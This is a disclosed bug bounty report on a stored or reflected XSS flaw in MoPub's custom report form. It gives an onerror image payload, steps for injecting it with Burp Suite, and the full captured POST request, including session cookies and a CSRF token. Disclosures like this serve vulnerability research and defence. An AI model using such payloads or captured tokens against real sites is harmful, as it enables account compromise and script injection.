# XSS on https://app.mopub.com/reports/custom/add/ [new-d1]

## Report Details
- **Report ID**: 692352
- **URL**: https://hackerone.com/reports/692352
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-09-11T15:00:01.430Z
- **Disclosed**: 2019-12-07T17:25:49.754Z

## Reporter
- **Username**: c00lbugs
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Parameter**
new-d1

**Payload**
</img><img src=x onerror=alert(domain)>

**Steps to reproduce**
1. Go to URL: https://app.mopub.com/reports/custom/add/
2. Start burp suite proxy, intercept on.
4. Enter payload in vulnerable parameter.
3. click on Run and Save button.
4. You will see java-script getting executed. 

##POST Request
```
POST /reports/custom/add/ HTTP/1.1
Host: app.mopub.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.mopub.com/reports/custom/
X-CSRFToken: ITzZsPAjFJeRBqKUKodU5C4w2lu2x5MG7Gec9L8jtqMOVilWX7gPTxwsXcgIloIR
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------200821510612490
Content-Length: 1690
Connection: close
Cookie: _gcl_au=1.1.1687186367.1563287045; _ga=GA1.2.1543739358.1563287048; csrftoken=ITzZsPAjFJeRBqKUKodU5C4w2lu2x5MG7Gec9L8jtqMOVilWX7gPTxwsXcgIloIR; mp__mixpanel=%7B%22distinct_id%22%3A%20%2216bfb2ba1103c5-0143fdd5f3a3c58-4c312f7f-e1000-16bfb2ba111485%22%2C%22%24device_id%22%3A%20%2216bfb2ba1103c5-0143fdd5f3a3c58-4c312f7f-e1000-16bfb2ba111485%22%2C%22accountKey%22%3A%20%22%22%2C%22accessLevel%22%3A%20%22%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.mopub.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.mopub.com%22%7D; mp_mixpanel__c=1; sessionid=p49r0bbeqb3laimfoii6vcny4yxbv6ww; mp_c99579c4804fba6b8aeed7a911581652_mixpanel=%7B%22distinct_id%22%3A%20%22d897f99976a646f5a619e52ed44bbb80%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fapp.mopub.com%2Faccount%2Flogin%2F%3Fnext%3D%2Fdashboard%2F%22%2C%22%24initial_referring_domain%22%3A%20%22app.mopub.com%22%2C%22accessLevel%22%3A%20%22member%22%2C%22accountKey%22%3A%20%22aeb905f4d0984a02be8a00d27aae73df%22%2C%22__mps%22%3A%20%7B%7D%2C%22__mpso%22%3A%20%7B%7D%2C%22__mpus%22%3A%20%7B%7D%2C%22__mpa%22%3A%20%7B%7D%2C%22__mpu%22%3A%20%7B%7D%2C%22__mpr%22%3A%20%5B%5D%2C%22__mpap%22%3A%20%5B%5D%2C%22%24user_id%22%3A%20%22d897f99976a646f5a619e52ed44bbb80%22%2C%22%24had_persisted_distinct_id%22%3A%20true%2C%22%24device_id%22%3A%20%22285f16e8e3a64ffc9bcc629faccb3d23%22%7D

-----------------------------200821510612490
Content-Disposition: form-data; name="new-saved"

on
-----------------------------200821510612490
Content-Disposition: form-data; name="new-name"

hello xss
-----------------------------200821510612490
Content-Disposition: form-data; name="new-interval"

yesterday
-----------------------------200821510612490
Content-Disposition: form-data; name="new-start"

09/10/2019
-----------------------------200821510612490
Content-Disposition: form-data; name="new-end"

09/10/2019
-----------------------------200821510612490
Content-Disposition: form-data; name="new-sched_interval"

none
-----------------------------200821510612490
Content-Disposition: form-data; name="new-recipients"

ganesh@mailinator.com
-----------------------------200821510612490
Content-Disposition: form-data; name="new-d1"

app</img><img src=x onerror=alert(domain)>
-----------------------------200821510612490
Content-Disposition: form-data; name="new-d2"


-----------------------------200821510612490
Content-Disposition: form-data; name="new-show_attempts_or_reqs"

on
-----------------------------200821510612490
Content-Disposition: form-data; name="new-show_impressions"

on
-----------------------------200821510612490
Content-Disposition: form-data; name="new-show_clicks"

on
-----------------------------200821510612490
Content-Disposition: form-data; name="new-show_revenue"

on
-----------------------------200821510612490
Content-Disposition: form-data; name="new-show_ctr"

on
-----------------------------200821510612490
Content-Disposition: form-data; name="new-show_conversions"

on
-----------------------------200821510612490--

```

{F580318}

{F580319}

{F580316}

{F580317}

## Impact

Cross-site scripting is a flaw that allows users to inject HTML or JavaScript code into a page enabling arbitrary input. There are two main variants of XSS, stored and reflected, DOM.

## Attachments
- Annotation_2019-09-11_202218.JPG
- Annotation_2019-09-11_202118.JPG
- Annotation_2019-09-11_202251.JPG
- Annotation_2019-09-11_202806.JPG
